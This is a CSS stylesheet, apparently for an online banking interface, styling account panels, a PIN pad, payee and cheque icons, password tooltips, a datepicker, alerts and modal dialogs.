.item-description td div.accnt-act-details4 { width: 45%; padding: 0px; text-align: right; white-space: normal; }
.item-description td div.accnt-act-details4 a { /* margin: 5px 0 5px 0;*/ margin-bottom:5px;margin-right:5px; }
.toggle-btn { background: none repeat scroll 0 0 #f5f5f5; display: block; font-size: 14px; height: 40px; padding: 5px 0; text-decoration: none; text-align: center; }
.toggle-btn:after { content: "\f107"; font-family: fontAwesome; font-size: 13px; font-style: normal; font-weight: normal; padding: 2px 0 0 0; position: absolute; text-decoration: inherit; display: inline-block; float: none; margin-left:5px;}
.toggle-btn.Open:after { content: "\f106" }
#myToggleDiv { background: none repeat scroll 0 0 #F5F5F5; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05); padding: 10px; text-align: center; margin-bottom: 0 !important; }
.popup_box { width: 300px; position: absolute; z-index: 9999; background: #333333; border: 1px solid #333333; border-radius: 4px; padding: 10px; color: #fff; }
.popup_box:before { content: "\f0d8"; font-family: fontAwesome; font-size: 20px; font-style: normal; font-weight: normal; margin: -25px 0 0 145px; position: absolute; text-decoration: inherit; color: #333333; }
.account-balance-container span { color: #606060!important }
.account-balance-container { background: #f5f5f5; border: 1px solid #d8d8d8; padding: 10px 0 0 0; font-size: 1.2rem; font-size: 12px; color: #606060!important; font-weight: normal!important; }
.account-balance-container h6 { margin-top: 5px }
.account-balance-container h6 span { float: right }
.RUIFW-container-well .data-set { padding: 0 0 25px }
.RUIFW-container-well .sub-title { font-weight: bold }
.RUIFW-tab-content:before, .RUIFW-tab-content:after { height: auto }
.RUIFW-pinpad-wrap > input { width: auto }
.RUIFW-pinpad { background: #f5f5f5; border: 1px solid #ccc; box-shadow: 1px 1px 4px #EEEEEE; border-radius: 5px; width: 162px; padding: 4px; white-space: pre-wrap; margin-top: 10px; display: block!important; }
.RUIFW-pinpad:before, .RUIFW-pinpad.top:before { display: none }
.RUIFW-pinpad .btn-default { background: #c51902!important; color: #fff!important; border-color: #ccc!important; font-weight: normal!important; padding: 6px 12px; }
.RUIFW-pinpad .RUIFW-key-clear { width: 72px; color: #606060; padding: 6px 12px; }
.RUIFW-pinpad .btn-default:hover { background: #c51902!important; border-color: #CCC!important; }
.RUIFW-pinpad .btn-default:active { background: #c51902!important; border-color: #CCC!important; }
.RUIFW-pinpad .btn-default:selected { background: #c51902!important; border-color: #CCC!important; }
.RUIFW-pinpad .btn-default:focus { background: #c51902!important; border-color: #CCC!important; }
.RUIFW-pinpad .btn-default.active { background-color: #c51902!important; border-color: #CCC!important; }

/*Jyothi Garadas*/
.space-pay table tr td:first-child { padding-left: 12px; white-space: nowrap!important; }
.pay-details3 label { width: 29%!important; font-weight:bold!important; font-size:12px!important; padding-bottom:10px; margin-right:3px;}
.pay-div {width:100%; padding: 0px!important;}
.pay1-width{width: 99%!important;}
.pay2-span{width: 39%!important;}
.wizard-box-pay { border:1px solid #e0e0e0; }
.right-border{border-right: 0px !important;}
.contenttbs_pay table tr th { background: #d7d7d7!important; border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 0px!important; vertical-align: text-top; text-shadow: none; }
.contenttbs_pay table tr th:last-child { border-right: 0px solid #d7d7d7!important }
.contenttbs_pay.RUIFW-table-sec-title:hover { background: #d7d7d7!important }
.contenttbs_pay table tr th:first-child { padding-left: 12px; white-space: pre-wrap!important; }
.contenttbs_pay table tr td:first-child { padding-left: 12px;}
.text-cursor {cursor:text!important;}
.acc_pop{text-align:justify!important; padding:10px 26px 0px 50px!important;}
.radio_pop{display:inline!important;}
.date-input-bg{background-color:#fff;}
.wordbreak{word-break:normal!important;}
.row-margin{margin-right:0px!important; margin-left: 5px!important;}
.RUIFW-tooltip + .tooltip > .tooltip-inner {-webkit-border-radius:4px; behavior:url('Js/border-radius.htc'); height:auto;}
.protect-cheque-icon-disabled { background: #ffffff url(../images/protect-cheque_grey.png) left top no-repeat; width:30px; height:20px; display:block;}
 input[type=text]::-ms-clear{display: none;}


@media only screen and (min-width: 0px) and (max-width: 800px){
.navbar-nav .open .dropdown-menu {
 position: absolute;width: 64%; background-color: #fff!important;box-shadow: none;border-width: medium 1px 1px;
border-style: none solid solid;border-color: -moz-use-text-color #CCC #CCC;
-moz-border-top-colors: none;-moz-border-right-colors: none;-moz-border-bottom-colors: none;-moz-border-left-colors: none;}
 .navbar-nav .open .dropdown-menu > li > a,
 .navbar-nav .open .dropdown-menu .dropdown-header {padding: 5px 0px 0px 12px;}
 .RUIFW-nav-main > li.has-submenu a { padding-right: 26px!important }
 .RUIFW-nav-main > li > a {padding:12px 6px 12px 6px!important;}
 .RUIFW-nav-main > li > .dropdown-menu > li div {padding: 0px 8px 15px 12px;}
 .RUIFW-nav-main > li > .dropdown-menu > li.banner{padding-top:5px}
 .RUIFW-nav-main > li > .dropdown-menu.payIEholder_Caribbean > li.banner{padding:7px 35px;}
 
 }


/*Popover-tooltip

.enrol-popover, .popover{background-color:#181818!important; color:#fff!important;}
.enrol-popover, .arrow{border-width: 0px!important;}
.enrol-popover.right, .arrow:after {
    bottom: -10px!important;
    left: 11px!important;
    content: " ";
    border-right-color:#181818!important;
    border-left-width: 0px;
	border-width: 6px!important;
}

.enrol-popover.right, .arrow {
	top:43%!important;
    left: -23px!important;
    margin-top: -2px!important;
    border-right-color: rgba(0, 0, 0, 0)!important;
    border-left-width: 0px;

}

.enrol-popover, .popover-content  {padding: 7px 10px!important;}*/


/*Praveen*/
.download-icon, .calculator-icon, .print-icon { margin: 0 10px 0 10px }
.download-icon { background: url(../images/download.png) left top no-repeat; width: 20px; height: 21px; }
.calculator-icon { background: url(../images/calculator.png) left top no-repeat; width: 20px; height: 21px; }
.print-icon { background: url(../images/print.png) left top no-repeat; width: 20px; height: 21px; }
.overview-container { background: #f5f5f5; border: 1px solid #d7d7d7; }
.bottom-box { border-left: 1px solid #c0bfbb; border-right: 1px solid #c0bfbb; border-top: 3px solid #c0bfbb; margin-top: 30px; padding-top: 5px; }
.main-icons > li > .dropdown-menu { margin-left: -305px!important }
.main-icons li .dropdown-menu h4 { padding-right: 15px; padding-left: 15px; font-size: 1.2em; margin-top: 10px; }
/*.main-icons li .dropdown-menu li {padding:0!important;text-align:left;}_NO__DOTCOMMA__AFTER__*/
/*.main-icons li .dropdown-menu li a{  padding:5px 0 5px 15px!important;}_NO__DOTCOMMA__AFTER__*/
.main-icons li .dropdown-menu { right: 10px }
.main-icons li .dropdown-menu li a { display: block!important; float: none; clear: both; vertical-align: top; overflow: hidden; }
.main-icons li .dropdown-menu li div { display: block!important; float: none; clear: both; vertical-align: top; overflow: hidden; }
.main-icons li.has-submenu a:after { padding: 0!important; font-family: none; font-weight: none; font-style: none; text-decoration: none; -webkit-font-smoothing: none; content: none; color: none; position: none; font-size: none; }
.main-icons li.has-submenu.open a:first-child:after { padding: 0!important; font-family: none; font-weight: none; font-style: none; text-decoration: none; -webkit-font-smoothing: none; content: none; color: none; position: none; font-size: none; }
.main-icons li.has-submenu a { padding-right: 12px!important }
/*--------------------------security image gallery css start---------------------*/
/* Float the ul to the right with a width to give 3 thumbnail images per row */
#thumbs { margin-left: auto; margin-right: auto; width: 235px; text-align: center!important; }
#thumbs div.item { margin-left: auto; margin-right: auto; text-align: center; }
#thumbs div.item ul { list-style: none; display: inline-block; padding: 0; margin-top: 20px; width: 213px; text-align: center; margin-left: auto; margin-right: auto; float: none; clear: both; vertical-align: top; overflow: hidden; }
/* Place the list items inline using display:inline for IE and float:left */
#thumbs ul li { display: inline-block; width: 65px; height: 65px; float: left; margin: 2.5px 2.5px 2.5px 2.5px; }
/div.content { /* The display of content is enabled using jQuery so that the slideshow content won't display unless javascript is enabled. */ display: none; text-align: center; vertical-align: text-top; margin-left: auto; margin-right: auto; width: 205px; }
div.content a, div.navigation a { text-decoration: none; color: #777; }
div.content a:focus, div.content a:hover, div.content a:active { text-decoration: underline }
div.controls { margin-top: 5px; height: 23px; }
div.controls a { padding: 5px }
div.ss-controls { float: left }
div.nav-controls { float: right }
div.slideshow-container { position: relative; clear: both; /*margin-top: 6%!important;text-align:center;*/ }
div.slideshow a.advance-link { display: block; width: 205px; height: 205px; /* This should be set to be at least the height of the largest image in the slideshow */ text-align: center; margin-left: auto; margin-right: auto; }
div.slideshow a.advance-link:hover, div.slideshow a.advance-link:active, div.slideshow a.advance-link:visited { text-decoration: none }
div.slideshow a.advance-link img { width: 205px; border: 5px solid #e8e6de; height: 205px; /* This should be set to be at least the height of the largest image in the slideshow */ }
div.slideshow img { vertical-align: middle; border: 1px solid #ccc; }
.imgleft a { margin-left: 0px!important }
ul.thumbs { clear: both; margin: 0; padding: 0; }
ul.thumbs li { float: none; padding: 0; margin: 0; list-style: none; }
a.thumb { padding: 0; display: inline; border: none; }
a.thumb img { width: 65px; height: 65px; }
ul.thumbs li.selected a.thumb { border: 3px solid Red; display: inline-block; }
ul.thumbs li.selected a.thumb img { width: 62px; height: 62px; }
ul.thumbs li:last-child { margin-left: 34.1%!important }
ul.thumbs li.selected a.thumb:hover img { width: 62px; height: 62px; margin: 0px!important; }
ul.thumbs li a.thumb:hover img { width: 70px; height: 70px; margin: -2.5px 2.5px 2.5px -2.5px; overflow: visible!important; }
a.thumb:focus { outline: none }
ul.thumbs img { border: none; display: block; }
/*--------------------------security image gallery css end---------------------*/
/*------------password info tooltip css start-------*/
#pswd_info { position: absolute; overflow: visible; /*bottom: -75px;   ; bottom: -105px\9; /* IE Specific */: ; /*right: 55px;*/ margin-top: 2px; margin-left: 50px; width: 250px; z-index: 1060;}
#pswd_info .passarr { background: url(../images/tooltip_edge.png) 30px top no-repeat; height: 10px; margin-bottom: -1px; position: relative; }
#pswd_info .passcon { background: #ffffff; padding: 15px 15px 10px 15px; border: 1px solid #CCCCCC; box-shadow: 0 6px 12px rgba(0, 0, 0, .175); }
#pswd_info .passcon ul { margin: 0; padding: 0; }
#pswd_info .passcon ul li { list-style: none; margin: 0; padding: 0 0 0 15px; }
#pswd_info h4 { margin: 0 0 10px 0; padding: 0; font-size: 1em; }
/*#pswd_info::before {
    background:#fefefe;
    content: "\25B2"!important;
    position:absolute;
    top:-12px;
    left:45%;
    font-size:14px;
    line-height:14px;
    color:#ddd;
    text-shadow:none;
    display:block;border:1px solid red;
}*/
.invalid { background: url(../images/error_12x10.png) no-repeat 0 6px!important; padding-left: 22px; padding-bottom: 3px!important; padding-top: 3px!important; color: #696969; vertical-align: text-top; }
.valid { background: url(../images/success_12x10.png) no-repeat 0 6px!important; padding-left: 22px; padding-bottom: 3px!important; padding-top: 3px!important; color: #696969; vertical-align: text-top; }
.bullet { background: url(../images/bullet_12x10.png) no-repeat 0 50%; padding-left: 22px; line-height: 24px; color: #696969; }
#pswd_info { display: none }
#repswd_info { display: none }
.has-error #repswd_info { display: none }
.has-error #repswd_info { position:absolute; margin-left: 50px; margin-top:2px!important; width: 250px;z-index: 1060;}
#repswd_info { position: absolute;  margin-left: 50px; margin-top: 2px; width: 250px; z-index: 1060; }
#repswd_info .passarr { background: url(../images/tooltip_edge.png) 30px top no-repeat; height: 10px; margin-bottom: -1px; position: relative; display: block; }
#repswd_info .passcon { background: #ffffff; padding: 15px 15px 10px 15px; border: 1px solid #CCCCCC; box-shadow: 0 6px 12px rgba(0, 0, 0, .175); }
#repswd_info .passcon ul { margin: 0; padding: 0; }
#repswd_info .passcon ul li { list-style: none; margin: 0; padding: 0 0 0 15px; }
#repswd_info h4 { margin: 0 0 10px 0; padding: 0; font-size: 1em; }
.navleft { padding-right: 5px!important; padding-left: 20px!important; }
.navleft .exp-collapse a:before { color: #ffffff!important; font-size: 14px!important; margin: -1px 10px 0 -15px; }
.navleft .exp-collapse a { margin-left: 10px }
.navleft .exp-collapse h5 a { margin-left: 0px; font-size: 1.2rem!important; }
.navleft .hr-separator { margin-bottom: 0px }
.ACnumber { text-align: right; margin-right: 25px; display: inline-block; position: absolute; right: 20px; }
.accountDataset { padding: 15px; background: #e7e7e7; text-align: right!important; }
.accountDataset-bdp { padding: 11px; padding-bottom: 0px; text-align: right!important; }
.accountDataset-bdp .data-set { text-align: left!important; background: #e7e7e7; padding: 15px 15px 15px 0; }
.accountDataset .data-set { text-align: left!important; background: #e7e7e7; padding: 15px 15px 0 15px; border-bottom: 1px solid #ffffff; }
.accountDataset .data-set div { padding-left: 0!important; margin-bottom: 5px; }
.accountDataset button { margin-top: 20px }
.account-balance-container .toggle-btn { padding-bottom: 10px!important; padding-top: 5px!important; height: 30px!important; display: block; text-align: center; float: none; clear: both; vertical-align: top; overflow: hidden; }
.account-balance-container .toggle-btn:before { display: inline-block }
.tandcHolder { border: 1px solid #d7d7d7; height: 300px; background: #fff; overflow: scroll; padding: 10px; }
.tandcHolder h4 { margin-top: 0px }
.SATAppletHolder { border: 1px solid #d7d7d7; background: #fff; overflow: hidden; text-align: center; }
.SATAppletHolder img { width: 100% }
.passwordinfo ul { margin: 0; padding: 0; }
.passwordinfo ul li { list-style: none; margin: 0; padding: 0 0 0 15px; }
.wizard_top_border { border-top: 1px solid #d8d8d8 }
.device_image { }
.device_image ol { margin: 0 0 0 5px; padding: 0; }
.whitebackground { background: #ffffff!important }
.whitebackground:hover { background: #ffffff!important; border-color: transparent !important; }
.whiteborder{ border:1px solid transparent!important;}
/*  Add Payee/Recipients button */
.btn-default{text-shadow:none;}

a.add-payee > span,a.add-recipient > span{
                vertical-align: top;
                display: inline-block;
                width: 20px;
                height: 20px;
}

a.add-recipient > span,a.add-recipient > span:hover { background: transparent url(../images/add-recipient-white.png) left top no-repeat; }

a.add-payee > span,a.add-payee > span:hover { background: transparent url(../images/add-payee_white.png) left top no-repeat;}

a.add-payee,a.add-recipient{
  padding: 4px 16px 4px 22px;
}
a.add-payee.payment-transfer-activity,a.add-recipient.payment-transfer-activity{
  margin-right:8px !important;
  margin-left:20px;
}

button.dropdown-toggle.payment-transfer-activity{
  width:60px;
  height: 30px;
  top:-1px;
}
a.new-button.payment-transfer-activity{
  min-width:60px;
  height: 29px;
  padding:5px 10px !important;
  border: 1px solid #da1c05!important; background: #da1c05!important;
}
ul.dropdown-menu.payment-transfer-activity {
  top:10px;
}
div.sub-header-bg.payment-transfer-activity {
  white-space: normal;
}

button.payment-transfer-activity.add-payee{position:absolute; margin:0 0 0 -68px;}
.open > .payment-transfer-activity.add-payee {background-color: #fff !important; border-top: 1px solid #cccccc!important;
    border-right: 1px solid #cccccc!important;    border-left: 1px solid #cccccc!important;    border-bottom: 1px solid #fff!important;  important; border-radius:3px 3px 0 0!important; z-index: 1001 !important; }
.open .payment-transfer-activity.add-payee span.caret {border-top-color: #333;}
.open > .payment-transfer-activity.add-payee .user-icon-white {background: url(../images/add-payee_gray.png) left top no-repeat;}

.bp-max-amount-info {
    background-color: white;
    padding: 15px;
    border: solid 1px #E4E4E4;
    border-radius: 4px;
    margin: 16px;
}

.bp-max-amount-info::after {
    content: "";
    clear: both;
    display: table;
}

.bp-max-amount-info > img {
    float: left;
}

.bp-max-amount-info > span {
    float: right;
    width: 94%;
}

.RUIFW-nav-tabs .quick-menu_TransfersoverviewPage { margin:-3px 10px 0 0;}

.user-icon { background: #ffffff url(../images/add-payee.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.user-icon:hover { background: #ffffff url(../images/add-payee_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.user-icon-white { background: url(../images/add-payee_white.png) left top no-repeat; width: 20px; height: 20px; display:inline-block; margin-top:3px; }
.user-icon-white:hover { background:url(../images/add-payee_white.png) left top no-repeat; width: 20px; height: 20px; display: inline-block;margin-top:3px; }
.dollar-icon { background: #ffffff url(../images/dollar-sign_red.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.dollar-icon-grey { background: #ffffff url(../images/dollar-sign_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.dollar-icon:hover { background: #ffffff url(../images/dollar-sign_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.trash-icon { background: #ffffff url(../images/trash_red.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.trash-icon:hover { background: #ffffff url(../images/trash_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.pencil-icon { background: #ffffff url(../images/edit_red.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.pencil-icon-gray { background: #ffffff url(../images/edit_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.pencil-icon:hover { background: #ffffff url(../images/edit_gray.png) left top no-repeat; width: 20px; height: 20px; display: block; }
.userADD-icon { background: #ffffff url(../images/add-payees.png) left top no-repeat; width: 27px; height: 20px; display: block; }
.userADD-icon:hover { background: #ffffff url(../images/add-payees_gray.png) left top no-repeat; width: 27px; height: 20px; display: block; }
.stop-cheque-icon { background: #ffffff url(../images/stop-cheque.png) left top no-repeat; width: 30px; height: 20px; display: block; }
.stop-cheque-icon:hover { background: #ffffff url(../images/stop-cheque_grey.png) left top no-repeat; width: 30px; height: 20px; display: block; }
.protect-cheque-icon { background: #ffffff url(../images/protect-cheque.png) left top no-repeat; width: 30px; height: 20px; display: block; }
.protect-cheque-icon:hover { background: #ffffff url(../images/protect-cheque_grey.png) left top no-repeat; width: 30px; height: 20px; display: block; }
.New-iconbtn { height: 30px!important; background: #d81e05!important; border: 1px solid #bd0000; padding: 1px!important; margin: 10px 15px 0 0!important; width: 40px!important; }
.New-iconbtn3 { height: 20px!important; background: #d81e05!important; border: 1px solid #bd0000!important; padding: 1px!important; margin: 0px 10px 0 0!important; width: 40px!important; }
.New-iconbtn:hover { background: #ed1c00!important }
.New-icontxt { display: block!important; nowhitespace: afterproperty; color: #ffffff!important; font-size: 11px; font-family: Arial, Helvetica, sans-serif; font-weight: normal; /*margin-right: 15px!important;*/ text-shadow:none;; }
.New-icontxt:hover { display: block!important; color: #ffffff!important; font-size: 11px; font-family: Arial, Helvetica, sans-serif; }
a .New-icontxt { margin-top:1px }
.New-iconbtn2 { height: 20px!important; background: #d81e05!important; border: 1px solid #bd0000!important; margin: 10px 15px 0 0!important; width: auto!important; padding: 0 7px 0 7px!important; }
.New-iconbtn2:hover { background: #ed1c00!important;border: 1px solid #bd0000!important; }
.New-iconbtn3:hover { background: #ed1c00!important;border: 1px solid #bd0000!important; }
.userADD-icon1 { background: #ffffff url(../images/add-payees.png) center 10px no-repeat; width: 27px; height: 20px; display: block; }
.userADD-icon1:hover { background: #ffffff url(../images/add-payees_gray.png) center 10px no-repeat; width: 27px; height: 20px; display: block; }
.New-icontxt1 { display: block; color: #d81e05!important; font-size: 11px; font-family: Arial, Helvetica, sans-serif; font-weight: bold; margin-right: 15px!important; width: 27px; height: 20px; }
.New-icontxt1:hover { display: block; color: #606060!important; font-size: 11px; font-family: Arial, Helvetica, sans-serif; font-weight: bold; width: 27px; height: 20px; }
/*.tabletextmiddle { margin-top:-10px!important;}_NO__DOTCOMMA__AFTER__*/
.tabletextmiddle tr td { vertical-align: middle!important }
.btn.actionicon-btn.icon-btn, .RUIFW-btn.icon-btn { height: 40px; width: 40px; color: #ffffff!important; }
a.btn.actionicon-btn.icon-btn, a.RUIFW-btn.icon-btn { height: 40px; width: 40px; color: #ffffff!important; float: none; overflow: hidden; clear: both; vertical-align: top; display: inline-block; text-align: center; background-color:#ffffff!important; border:none!important; }
a.RUIFW-btn.icon-btn span { position: relative; right: 5px; top: 5px; }
.btn.actionicon-btn { background-color: #fff; color: #d71e05!important; padding: 10px; }
.topupoverbut_align { padding-top: 3px }
.topupoverbut_align button.New-iconbtn { padding: 15px; height: 40px; width: 75px!important; clear: both; vertical-align: top; }
.payoverbut_align button{ padding: 15px; height: 40px; width: 45px!important; clear: both; vertical-align: top; }
.topupoverbut_align a.New-iconbtn { padding: 15px; height: 40px; width: 75px!important; clear: both; vertical-align: top; }
.payoverbut_align a{ /*padding: 15px; height: 40px; width: 45px!important;*/ clear: both; vertical-align: top; }
.payoverbut_align button span { }
.payoverbut_align { position: relative; vertical-align: top; margin: -40px 0 0 0; float: right; height: 40px; clear: both; }
.payoverbut_align4 { position: relative; nowhitespace: afterproperty; margin: 5px 5px -15px 0!important; display: inline-block; overflow: visible; /*border-right: 1px solid #606060;*/; }
.payoverbut_align4 button.New-iconbtn { width: 75px!important; vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align4 a.New-iconbtn { width: 75px!important; vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align4 a:hover{border-bottom: none !important;}
.payoverbut_align4 input.New-iconbtn { width: 75px!important; vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align2 { position: relative; nowhitespace: afterproperty; margin: 5px 5px -15px 0!important; overflow: visible; /*border-right: 1px solid #606060;*/; }
.payoverbut_align2 button { width: 45px!important; vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align2 a { /*width: 45px!important;*/ vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align2 input { width: 45px!important; vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align3 { position: absolute; nowhitespace: afterproperty; margin: 10px 0 0 -110px!important; display: inline-block; overflow: visible; /*border-right: 1px solid #606060;*/ text-align:left; display:inline-block; width:100px;; }
.payoverbut_align3 button { vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align3 a { vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.payoverbut_align3 input { vertical-align: top; overflow: visible; float: left; margin-right: 5px; }
.accnt-act-details3 p { margin: 0; vertical-align: text-top; word-break: initial;}
.accnt-act-details3 p span { display: inline-block; nowhitespace: afterproperty; word-wrap: break-word; /* Internet Explorer 5.5+ */ word-break: initial; width: 60%; white-space: pre-wrap; vertical-align: text-top; }
.accnt-act-details3 label { width: 35%; font-weight: normal!important; font-size: 12px; vertical-align: text-top; display: inline-block; word-break: iinitial; }
.accnt-act-details3 .links_acct_details { vertical-align: bottom; text-align: right; width: 99.5%; }
.accnt-act-details6 .links_acct_details { vertical-align: bottom; text-align: right; width: 99.5%; }
.item-description td div.accnt-act-details6 { /*  margin-left: 5%;*/padding:0px;white-space:normal;; width: 100%; }
.accnt-act-details6 p { margin: 0; vertical-align: text-top; word-break: initial;}
.accnt-act-details6 p span { display: inline-block; nowhitespace: afterproperty; word-wrap: break-word; /* Internet Explorer 5.5+ */ word-break: initial; width: 60%; vertical-align: text-top; }
.accnt-act-details6 label { width: 35%; font-weight: normal!important; font-size: 12px; vertical-align: text-top; display: inline-block; word-break: iinitial; }
.Filter-content { padding: 20px; margin: 5px 0 0 0; }
.Filter-content input { margin-top: 3px }
.Filter-content select { margin-top: 3px }
.Filter-content table { border: none!important }
.Filter-content table tr td { border: none!important; vertical-align: middle; }
.Filter-content table tr th { border-right: 0px solid #ffffff!important; background: transparent!important; }
.Filter-content table tr td a { margin-top: 15px }
.Filter-content table tr td a:last-child { margin-left: 10px }
.Filter-content table tr td a:first-child { margin-right: 10px }
.fliterButtons { vertical-align: top; text-align: right; padding: 15px 0 0  0; }
table tr.selected { display: table-row }
table tr.highlighted { background-color: #fbfbfb }
table tr.highlighted td { border-bottom: 1px solid #fbfbfb }
.item-description td { border-top: 1px solid #fbfbfb }
.table { margin-bottom: 0!important }
.wizard-form-content input[type="checkbox"] { vertical-align: text-bottom }
.wizard-form-title_border { border: 1px solid #d8d8d8 }
.Tab_overview_details_head { display: inline-block; margin-top: 5px!important; margin-left: 5px!important; }
.preAutButicons { margin: 0 }
.preAutButicons button.RUIFW-btn { background-color: #ffffff!important; border: none; }
.preAutButicons button { float: left; margin-right: 10px!important; height: 50px!important; width: 50px!important; }
.preAutButicons button.newicon span { height: auto!important }
.preAutButicons .newicon{ padding:0!important;}
.preAutButicons .deletepayee{ padding:0!important;}
.preAutButicons span.trash-icon { margin-left: 0px }
.preAutButicons h5 { font-size: 1.2em; margin: 0!important;   }
.preAutButicons p { margin-top: 3px!important }
.preAutButicons .New-icontxt { color: #d81e05!important; font-weight: bold; }
.preAutButicons .icon-bookmark { color: #d81e05!important }
.preAutButicons .icon-bookmark:hover { color: #606060!important }
.preAutButicons .New-icontxt:hover { color: #606060!important }


.preAutButicons .RUIFW-btn { background-color: #ffffff!important; border: none; float: left!important; margin-right: 10px!important; height: 50px!important; width: 50px!important;}
.preAutButicons .RUIFW-btn img{ margin-top:10px;}
.preAutButicons .newicon span { height: auto!important }

.icon-bookmark:before { content: "\f02e" }
input[type="radio"] { margin-right: 5px!important; display: inline-block; background-color: none!important; border: 1px solid #cccccc; border: none; }
.RUIFW-row label { font-weight: bold; color: #606060; font-size: 1.3rem; font-size: 13px; }
.modellabel { margin-bottom: -15px!important; min-height: 1px!important; padding-left: 15px; }
Select.form-control { /* width: 269px!important; _NO__DOTCOMMA__AFTER__*/ }
.form-control { height: 30px!important; font-size: 12px; padding: 6px 5px; }
.signin-imp { border: 1px solid #d7d7d7; background-color: #ffffff; padding: 10px; margin-bottom: 10px; }
.active:focus { outline: none!important }
.activeEvent:focus { outline: none!important }
button:focus { outline: none!important }
.active a:focus { outline: none!important }
F
.carousel-control:focus { outline: none!important }
.greyBG { background: #f7f8fa!important }
.greyTXT { color: #e0e0e0!important }
.small_text { font-size: 0.9em!important; display: block!important; }
.compareInterestRates .modal-dialog { border: 1px solid red!important }
.RUIFW-btn-sm { filter: none !important; line-height: 10px; padding: 4px 5px; min-height: 16px; }
.btn-sm, .btn-xs { padding: 0 5px!important; font-size: 12px; line-height: 1.5; border-radius: 3px; }
/*datepicker*/
.datepicker:before { display: none }
.datepicker thead tr:first-child { background-color: #f7f8fa }
.datepicker th { font-weight: normal!important; color: #606060!important; }
.datepicker td, .datepicker th { text-align: center; width: 20px; height: 20px; border: none; }
.future-dates-calendar .datepicker table tr td.disabled, .future-dates-calendar .datepicker table tr td.disabled:hover { background: none; color: #5E5E5C; cursor: default; }
.datepicker table tr td.old, .datepicker table tr td.new { background-color: #f9f9f7 !important }
.datepicker table tr td { background-color: #d6d6d4 !important; border: 1px solid #fff !important; color: #5e5e5c; }
.datepicker td, .datepicker th { border-radius: 0 }
.datepicker td.active.today, .datepicker td.active.today:hover { text-shadow: none!important; background: none; }
.datepicker td.active, .datepicker td.active:hover { color: #fff; filter:none !important; }

.datepicker table tr td.activeEvent, .datepicker table tr td.activeEvent:hover, .datepicker table tr td.activeEvent.disabled, .datepicker table tr td.activeEvent.disabled:hover { background: url(../images/calendar_sel.png); background-repeat: no-repeat; background-position: center; background-size: 30px 30px; color: #fff; cursor: pointer;  }

.datepicker.dropdown-menu th, .datepicker.datepicker-inline th, .datepicker.dropdown-menu td, .datepicker.datepicker-inline td { padding: 10px 8px 10px 8px }
.datepicker td, .datepicker th { text-align: center; width: 44px; height: 20px; }
.datepicker-switch { font-size: 1.5rem; font-size: 15px; }
.datepicker th.datepicker-switch { width: 145px }
/*alert box*/
*[class*="alert-"] { border-radius: 0 0 0 0 }
.alert-success { background: #d3ecba; border-color: #acdc79; color: #333333; padding: 25px 0 24px 0; margin: 5px!important; }
.icon-success { background: url(../images/success-message.png) right top no-repeat; width: 30px; height: 33px; padding-left: 66px; display: inline-block; margin-right: 37px!important; }
.alert span { margin: 0 10px; float: left; }
.close_icon { background: url(../images/close.png) center top no-repeat; width: 15px; height: 15px; border: 0; float: right; margin: -15px 10px 0 0; }
.alert-info { background: #cae4f2; border-color: #98bddd; color: #333333; padding: 25px 0 24px 0;  margin: 5px!important;}
.icon-msg { background: url(../images/Message-generic.png) right top no-repeat; width: 30px; height: 33px; padding-left: 66px; display: inline-block; margin-right: 37px!important; }
.alert-warning { background: #fcf38b; border-color: #e1cd7f; color: #333333; padding: 25px 0 24px 0;  margin: 5px!important;}
.alert.has-icon { padding-left: 50px }
.alert-icon-error { background: url(../images/error-message.png) right top no-repeat; width: 30px; height: 33px; }
.alert-icon-info { background: url(../images/warning_message.png) right top no-repeat; width: 30px; height: 33px; padding-left: 66px; display: inline-block; margin-right: 37px!important; }
.main-icons li .dropdown-menu { position: absolute; left: auto!important; right: 10px!important; width: 60%; }
.main-icons li .HelpHolder { width: 40% }
.main-icons li .HelpHolder_caribbean { width: 35% }
.main-icons li .settings_caribbean { width: 50% }
/*.navbar-nav > li > .dropdown-menu {
margin-top: 15px;
margin-left: -15px;
border-top-right-radius: 0;
border-top-left-radius: 0;}*/
.modal-header { min-height: 16.428571429px; padding: 25px 15px 0 30px; border-bottom: none; }
.modal-header .close { position: absolute; margin-top: -2px; right: 12px!important; top: 12px!important; }
.close { font-size: 20px; color: #000000!important; text-shadow: none; }
.modal-title { margin: 0; line-height: 1.428571429; text-align: left; color: #D81E05; font-size: 2em; }
.modal-body { position: relative; padding: 10px 30px 15px 30px; }
.modal-content { border-radius: 0px; webkit-box-shadow: none; box-shadow: none; }
.borderwhite { border: 1px solid transparent }
.border { border-top: 1px solid #f5f5f5!important; border-left: 1px solid #f5f5f5!important; }
.contenttbs table tr td { border-right: 2px solid #ffffff!important; border-top: 0px!important; border-left: 0px!important; border-bottom: 1px solid #f5f5f5!important; vertical-align: top; }
.modal-footer { padding: 10px 20px 25px; margin-top: 5px; text-align: right; border-top: none; }
.border td:last-child { text-align: right; border-right: 1px solid #f5f5f5!important; }
.border tbody { border-bottom: 1px solid #f5f5f5!important }
.table > tbody > tr > td { border-top: 1px solid #f5f5f5 }
.RUIFW-modal .close_icon { margin: -15px -5px 0 0 }
.RUIFW-hide, .RUIFW-page-break { display: none!important; overflow: hidden!important; }
.exp-collapse a.Open:before { content: "\f0d7"!important }
.table > thead > tr > th { font-weight: normal }
h1 { margin-top: 16px; margin-bottom: 15px; }
.RUIFW-append > *[class*="icon"] { left: auto }
*[class*="RUIFW-container"] .RUIFW-row + .RUIFW-row { margin-top: 18px }
.RUIFW-row.row-note { margin-top: 5px !important; }
